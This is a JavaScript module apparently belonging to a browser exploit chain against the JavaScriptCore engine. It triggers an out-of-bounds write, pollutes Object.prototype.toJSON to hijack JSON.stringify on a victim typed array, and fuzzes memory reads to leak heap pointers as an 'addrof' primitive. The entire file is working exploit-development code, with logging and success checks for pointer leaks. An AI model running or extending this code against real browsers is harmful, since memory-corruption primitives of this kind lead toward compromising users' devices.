// js/script3/testArrayBufferVictimCrash.mjs (v60_FuzzTypedArrayReadOffsets)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO = "OriginalHeisenbug_TypedArrayAddrof_v60_FuzzTypedArrayReadOffsets";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let leak_target_buffer_v60 = null;
let leak_target_dataview_v60 = null;

let victim_typed_array_ref_v60 = null;
let probe_call_count_v60 = 0;
let all_probe_interaction_details_v60 = [];
let first_call_details_object_ref_v60 = null;

const PROBE_CALL_LIMIT_V60 = 10;
// Offsets para tentar ler dos TypedArrays quando eles são 'this'
const FUZZ_OFFSETS_V60 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38];

function toJSON_TA_Probe_FuzzTypedArrayRead_v60() {
    probe_call_count_v60++;
    const call_num = probe_call_count_v60;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v60),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v60 && first_call_details_object_ref_v60 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v60 && leak_target_buffer_v60 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v60 && leak_target_dataview_v60 !== null),
        fuzzed_reads_result: null, // Para armazenar o array de leituras do fuzzing
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1_details_obj}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V60) {
            all_probe_interaction_details_v60.push(current_call_details);
            return { recursion_stopped_v60: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details WITH PAYLOADS.`, "info");
            first_call_details_object_ref_v60 = current_call_details;
            if (leak_target_buffer_v60) current_call_details.payload_AB = leak_target_buffer_v60;
            if (leak_target_dataview_v60) current_call_details.payload_DV = leak_target_dataview_v60;
            all_probe_interaction_details_v60.push(current_call_details);
            return current_call_details;
        }
        else if ( (current_call_details.this_is_leak_target_AB && current_call_details.this_type === '[object ArrayBuffer]') ||
                  (current_call_details.this_is_leak_target_DV && current_call_details.this_type === '[object DataView]') ) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ${current_call_details.this_type}! Fuzzing read offsets...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = (current_call_details.this_type === '[object ArrayBuffer]') ? new DataView(this) : this;
                if (view.byteLength < (FUZZ_OFFSETS_V60[FUZZ_OFFSETS_V60.length -1] + 8)) { // Verifica se o buffer é grande o suficiente para o maior offset
                    logS3(`[${current_call_details.probe_variant}] Target ${current_call_details.this_type} (len ${view.byteLength}b) too small for all fuzz offsets.`, "warn");
                }

                for (const offset of FUZZ_OFFSETS_V60) {
                    if (view.byteLength < (offset + 8)) {
                        fuzzed_reads.push({ offset: toHex(offset), error: "Offset out of bounds" });
                        continue;
                    }
                    let low = view.getUint32(offset, true);
                    let high = view.getUint32(offset + 4, true);
                    let ptr = new AdvancedInt64(low, high);
                    let temp_buffer = new ArrayBuffer(8); (new Uint32Array(temp_buffer))[0] = low; (new Uint32Array(temp_buffer))[1] = high;
                    let as_double = (new Float64Array(temp_buffer))[0];
                    fuzzed_reads.push({ offset: toHex(offset), low: toHex(low), high: toHex(high), int64_str: ptr.toString(true), as_double: as_double });
                }
                logS3(`[${current_call_details.probe_variant}] Fuzzed reads from ${current_call_details.this_type}: ${JSON.stringify(fuzzed_reads)}`, "vuln");
                current_call_details.fuzzed_reads_result = fuzzed_reads;
                all_probe_interaction_details_v60.push(current_call_details);
                return { fuzzed_reads_v60: fuzzed_reads, leaked_obj_type: current_call_details.this_type }; // Retorna todas as leituras
            } catch (e) {
                logS3(`[${current_call_details.probe_variant}] Err during fuzz read: ${e.message}`, "error");
                current_call_details.error_in_probe = e.message;
                all_probe_interaction_details_v60.push(current_call_details);
                return { addrof_error_v60: e.message, type: current_call_details.this_type, fuzzed_reads_attempt: fuzzed_reads };
            }
        }
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is C1_details_obj (re-entry or unexpected). Not modifying.`, "warn");
            all_probe_interaction_details_v60.push(current_call_details);
            return this;
        }
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}.`, "warn");
            all_probe_interaction_details_v60.push(current_call_details);
            return { generic_marker_v60: call_num, type: current_call_details.this_type };
        }
    } catch (e_probe) {
        current_call_details.error_in_probe = e_probe.message;
        const FNAME_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO;
        logS3(`[${FNAME_REF}] Probe Call #${call_num}: CRIT ERR: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_REF);
        all_probe_interaction_details_v60.push(current_call_details);
        return { error_marker_v60: call_num, error_msg: e_probe.message };
    }
}

export async function executeTypedArrayVictimAddrofTest_FuzzTypedArrayReadOffsets() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (FuzzTypedArrayReadOffsets) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO} Init...`;

    probe_call_count_v60 = 0;
    all_probe_interaction_details_v60 = [];
    victim_typed_array_ref_v60 = null;
    first_call_details_object_ref_v60 = null;

    leak_target_buffer_v60 = new ArrayBuffer(0x80);
    leak_target_dataview_v60 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A";
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v60)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v60)" };
    // ...

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v60 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        // ...

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FuzzTypedArrayRead_v60, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v60)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v60);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            logS3("STEP 3: Checking for leaked addresses from fuzzed reads (v60)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;

            const process_fuzzed_reads = (payload_results, target_addrof_result, objTypeName) => {
                if (payload_results && payload_results.fuzzed_reads_v60 && Array.isArray(payload_results.fuzzed_reads_v60)) {
                    heisenbugIndication = true; // Se chegamos aqui, a heisenbug funcionou para o payload ser 'this'
                    logS3(`  V60_ANALYSIS: Found 'fuzzed_reads_v60' for ${objTypeName}. Count: ${payload_results.fuzzed_reads_v60.length}`, "good");
                    for (const read_attempt of payload_results.fuzzed_reads_v60) {
                        if (read_attempt.error) {
                            logS3(`    Offset ${read_attempt.offset}: Error - ${read_attempt.error}`, "warn");
                            continue;
                        }
                        logS3(`    Offset ${read_attempt.offset}: Low=${read_attempt.low}, High=${read_attempt.high}, Int64=${read_attempt.int64_str}, Double=${read_attempt.as_double}`, "dev_verbose");
                        // Tentar interpretar como ponteiro JSCell (geralmente tag 0 ou terminando em 0)
                        // Ou como JSValue (precisaria de mais lógica para desmascarar)
                        const highVal = parseInt(read_attempt.high, 16);
                        const lowVal = parseInt(read_attempt.low, 16);

                        // Exemplo simples de validação de ponteiro (pode ser mais sofisticado)
                        // Procurar por ponteiros que não sejam nulos e estejam em um range típico do heap.
                        if ( (highVal === JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH && (lowVal & JSC_OFFSETS.JSValue.TAG_MASK) === JSC_OFFSETS.JSValue.CELL_TAG) || // Exemplo de JSValue*
                             (highVal > 0x10000 && highVal < 0x90000000) && // Endereço de heap plausível (não pequeno, não stack)
                             ((lowVal & 0xF) === 0) ) { // Alinhamento
                            target_addrof_result.success = true;
                            target_addrof_result.msg = `V60 SUCCESS (${objTypeName} Fuzz Read): Potential Ptr ${read_attempt.int64_str} from offset ${read_attempt.offset}`;
                            logS3(`  !!!! V60 POTENTIAL POINTER FOUND for ${objTypeName} at offset ${read_attempt.offset}: ${read_attempt.int64_str} !!!!`, "vuln");
                            break; // Parar no primeiro ponteiro encontrado para este objeto
                        }
                    }
                    if (!target_addrof_result.success) {
                        target_addrof_result.msg = `V60 Fuzzed reads for ${objTypeName} did not yield a clear pointer pattern.`;
                    }
                } else if (!target_addrof_result.success) {
                     target_addrof_result.msg = `V60 No 'fuzzed_reads_v60' for ${objTypeName} in output.`;
                }
            };

            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
                if (stringifyOutput_parsed.payload_AB) {
                    process_fuzzed_reads(stringifyOutput_parsed.payload_AB, addrof_A_result, "ArrayBuffer");
                } else if (!addrof_A_result.success) {
                     addrof_A_result.msg = "V60 No 'payload_AB' in stringifyOutput.";
                }
                if (stringifyOutput_parsed.payload_DV) {
                    process_fuzzed_reads(stringifyOutput_parsed.payload_DV, addrof_B_result, "DataView");
                } else if (!addrof_B_result.success) {
                     addrof_B_result.msg = "V60 No 'payload_DV' in stringifyOutput.";
                }
            }


            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO}: Addr SUCCESS!`;
            } else if (heisenbugIndication) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO}: No Heisenbug?`;
            }

        } catch (e_str_outer) {
            errorCapturedMain = e_str_outer;
            logS3(`  CRITICAL ERROR during result processing: ${e_str_outer.name} - ${e_str_outer.message}${e_str_outer.stack ? '\n'+e_str_outer.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO}: Processing ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_overall_main) {
        errorCapturedMain = e_overall_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_overall_main.name} - ${e_overall_main.message}${e_overall_main.stack ? '\n'+e_overall_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V60_FTARO} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v60}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        // ... (limpeza de globais) ...
        victim_typed_array_ref_v60 = null;
        all_probe_interaction_details_v60 = [];
        probe_call_count_v60 = 0;
        first_call_details_object_ref_v60 = null;
        leak_target_buffer_v60 = null;
        leak_target_dataview_v60 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        stringifyResult: stringifyOutput_parsed,
        rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v60],
        total_probe_calls: probe_call_count_v60,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
